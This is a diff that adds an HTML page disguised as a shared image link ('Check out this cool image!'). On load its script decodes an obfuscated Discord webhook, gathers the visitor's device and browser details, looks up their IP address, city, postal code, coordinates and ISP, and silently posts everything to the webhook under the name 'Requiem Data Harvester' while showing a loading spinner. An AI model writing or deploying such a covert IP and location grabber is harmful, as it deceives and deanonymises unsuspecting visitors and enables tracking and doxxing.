@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Check out this cool image!">
+    <meta property="og:description" content="provided by c2xe">
+    <meta property="og:image" content="https://sdmntprnorthcentralus.oaiusercontent.com/files/00000000-dae8-622f-91d7-f44dc9e24215/raw?se=2025-06-29T00%3A55%3A57Z&sp=r&sv=2024-08-04&sr=b&scid=ceb284ee-bb11-5abf-a658-55ac70826bbe&skoid=e9d2f8b1-028a-4cff-8eb1-d0e66fbefcca&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-06-28T19%3A51%3A57Z&ske=2025-06-29T19%3A51%3A57Z&sks=b&skv=2024-08-04&sig=7E4thJKJalRYCuXla3yiHP41B4pxsKt8Kfl%2B6V65JsY%3D">
+    <meta property="og:url" content="https://c2xe.github.io">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+        
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        .complete-message {
+            display: none;
+            color: #fff;
+            font-size: 3rem;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #0088ff;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #00ffff, 0 0 20px #0088ff; }
+            to { text-shadow: 0 0 15px #00ffff, 0 0 25px #0088ff, 0 0 30px #0066ff; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div class="complete-message">GG'S FROM Requiem</div>
+
+    <script>
+        const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MzAzNjA1OTkxODQ3MTIyOS8xV2Q0c2d2d1hzNDR0azdKLVhneVRuX09kYVJ0eXpRWUZwd1B6OWdwd1MyMkpERENieGZZcEowUVZqTEpvdG42WGN5Qg==';
+        
+        function decodeWebhook() {
+            return atob(encodedWebhook);
+        }
+
+        async function collectData() {
+            const basicData = {
+                system: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    cpuCores: navigator.hardwareConcurrency || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 'unknown'
+                },
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type || 'unknown'
+                },
+                browser: {
+                    cookiesEnabled: navigator.cookieEnabled,
+                    languages: navigator.languages?.join(', ') || 'unknown',
+                    doNotTrack: navigator.doNotTrack || 'unknown',
+                    pdfViewerEnabled: navigator.pdfViewerEnabled || 'unknown'
+                },
+                network: {
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType || 'unknown',
+                        downlink: navigator.connection.downlink || 'unknown',
+                        rtt: navigator.connection.rtt || 'unknown',
+                        saveData: navigator.connection.saveData || 'unknown'
+                    } : 'unknown'
+                },
+                location: {}
+            };
+
+            const ipv4Promise = fetch('https://api.ipify.org?format=json')
+                .then(r => r.ok ? r.json() : Promise.reject('IPv4 API failed'))
+                .then(data => ({ ip: data.ip }))
+                .catch(e => {
+                    console.log('IPv4 fetch failed, trying fallback:', e);
+                    return fetch('https://ipapi.co/json/')
+                        .then(r => r.ok ? r.json() : Promise.reject('IP API failed'))
+                        .then(data => {
+                            if (data.ip && data.ip.includes(':')) {
+                                return fetch('https://api4.my-ip.io/ip.json')
+                                    .then(r => r.ok ? r.json() : Promise.reject('IPv4 fallback failed'))
+                                    .then(ipData => ({ ip: ipData.ip }));
+                            }
+                            return data;
+                        });
+                })
+                .catch(e => {
+                    console.error('All IP fetch attempts failed:', e);
+                    return null;
+                });
+
+            const [ipData] = await Promise.all([ipv4Promise]);
+
+            if (ipData) {
+                let locationData = { ip: ipData.ip };
+                
+                if (!ipData.city) {
+                    try {
+                        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        if (locResponse.ok) {
+                            const locData = await locResponse.json();
+                            locationData = {
+                                ...locationData,
+                                city: locData.city || 'unknown',
+                                region: locData.region || 'unknown',
+                                country: locData.country_name || 'unknown',
+                                postal: locData.postal || 'unknown',
+                                latitude: locData.latitude || 'unknown',
+                                longitude: locData.longitude || 'unknown',
+                                timezone: locData.timezone || 'unknown',
+                                asn: locData.asn || 'unknown',
+                                org: locData.org || 'unknown'
+                            };
+                        }
+                    } catch (e) {
+                        console.error('Location details fetch failed:', e);
+                    }
+                } else {
+                    locationData = ipData;
+                }
+
+                basicData.location = locationData;
+            } else {
+                basicData.location = { error: 'Could not fetch location data' };
+            }
+
+            return basicData;
+        }
+
+        async function sendToDiscord(data) {
+            const webhookURL = decodeWebhook();
+            
+            const embed = {
+                title: "📊 Browser Data Collected",
+                color: 0x000000,
+                timestamp: new Date().toISOString(),
+                thumbnail: {
+                    url: "https://cdn.discordapp.com/attachments/1063277378371383316/1234567890123456789/computer-icon.png"
+                },
+                fields: [
+                    {
+                        name: "🖥️ **System Info**",
+                        value: `• **OS:** ${data.system.platform}\n` +
+                               `• **CPU:** ${data.system.cpuCores} cores\n` +
+                               `• **RAM:** ${data.system.deviceMemory}GB\n` +
+                               `• **User Agent:** \`${data.system.userAgent}\``,
+                        inline: true
+                    },
+                    {
+                        name: "📱 **Display Info**",
+                        value: `• **Resolution:** ${data.screen.width}×${data.screen.height}\n` +
+                               `• **Color Depth:** ${data.screen.colorDepth}-bit\n` +
+                               `• **Orientation:** ${data.screen.orientation}\n` +
+                               `• **Touch Points:** ${data.system.maxTouchPoints}`,
+                        inline: true
+                    },
+                    {
+                        name: "🌍 **Location Info**",
+                        value: `• **IP:** \`${data.location.ip || 'unknown'}\` (IPv4)\n` +
+                               `• **Location:** ${data.location.city || 'unknown'}, ${data.location.region || 'unknown'}\n` +
+                               `• **Country:** ${data.location.country || 'unknown'}\n` +
+                               `• **Coordinates:** ${data.location.latitude || 'unknown'}, ${data.location.longitude || 'unknown'}\n` +
+                               `• **ISP:** ${data.location.org || 'unknown'} (AS${data.location.asn || 'unknown'})`
+                    },
+                    {
+                        name: "🔍 **Browser Details**",
+                        value: `• **Cookies:** ${data.browser.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}\n` +
+                               `• **Languages:** ${data.browser.languages || 'unknown'}\n` +
+                               `• **Tracking:** ${data.browser.doNotTrack === '1' ? '❌ Blocked' : '✅ Allowed'}\n` +
+                               `• **PDF Viewer:** ${data.browser.pdfViewerEnabled ? '✅ Enabled' : '❌ Disabled'}`,
+                        inline: true
+                    },
+                    {
+                        name: "📶 **Network Info**",
+                        value: `• **Connection:** ${typeof data.network.connection === 'object' ? data.network.connection.effectiveType || 'unknown' : 'unknown'}\n` +
+                               `• **Speed:** ${typeof data.network.connection === 'object' ? data.network.connection.downlink || 'unknown' : 'unknown'} Mbps\n` +
+                               `• **Latency:** ${typeof data.network.connection === 'object' ? data.network.connection.rtt || 'unknown' : 'unknown'}ms\n` +
+                               `• **Data Saver:** ${typeof data.network.connection === 'object' ? (data.network.connection.saveData ? '✅ On' : '❌ Off') : 'unknown'}`,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: "Collected at",
+                    icon_url: "https://cdn.discordapp.com/emojis/1063277378371383316.webp"
+                },
+                author: {
+                    name: "Requiem Bot - by god",
+                    icon_url: "https://cdn.discordapp.com/attachments/1388019136298356820/1388668698298155219/download_1.png?ex=6861d201&is=68608081&hm=424ff69ad23f0fa08a88cc6a5564a925145c09ff2e786ccde258884dc6c8bfd2&"
+                }
+            };
+
+            return fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: "Requiem Data Harvester",
+                    avatar_url: "https://cdn.discordapp.com/attachments/1063277378371383316/1234567890123456789/bot-avatar.png",
+                    embeds: [embed]
+                })
+            });
+        }
+
+        (async () => {
+            try {
+                const data = await Promise.race([
+                    collectData(),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Data collection timeout')), 2000))
+                ]);
+                
+                console.log('Data collected:', data);
+                await sendToDiscord(data);
+                console.log('Data sent successfully');
+            } catch (error) {
+                console.error('Error:', error);
+            } finally {
+                document.querySelector('.loader').style.display = 'none';
+                document.querySelector('.complete-message').style.display = 'block';
+            }
+        })();
+    </script>
+</body>
+</html>
